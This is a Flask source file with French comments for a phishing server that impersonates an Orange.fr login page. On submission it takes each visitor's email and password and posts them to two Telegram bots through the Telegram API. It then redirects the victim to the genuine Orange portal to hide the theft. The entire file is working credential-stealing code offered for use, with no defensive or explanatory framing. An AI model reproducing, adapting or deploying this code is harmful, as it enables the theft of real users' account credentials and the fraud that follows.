from dotenv import load_dotenv
load_dotenv()
from flask import Flask, request, redirect, render_template
import requests
import os

app = Flask(__name__)

BOT_TOKEN_1 = os.getenv("TELEGRAM_BOT_TOKEN_1")
CHAT_ID_1 = os.getenv("TELEGRAM_CHAT_ID_1")
BOT_TOKEN_2 = os.getenv("TELEGRAM_BOT_TOKEN_2")
CHAT_ID_2 = os.getenv("TELEGRAM_CHAT_ID_2")


@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")

        message = f"Essai de connexion:\nEmail: {email}\nMot de passe: {password}"

        # Envoi au BOT 1
        url1 = f"https://api.telegram.org/bot{BOT_TOKEN_1}/sendMessage"
        data1 = {"chat_id": CHAT_ID_1, "text": message}
        requests.post(url1, data=data1)

        # Envoi au BOT 2
        url2 = f"https://api.telegram.org/bot{BOT_TOKEN_2}/sendMessage"
        data2 = {"chat_id": CHAT_ID_2, "text": message}
        requests.post(url2, data=data2)

        return redirect("https://www.orange.fr/portail/")

    return render_template("login.html")

if __name__ == "__main__":
    app.run(debug=True)
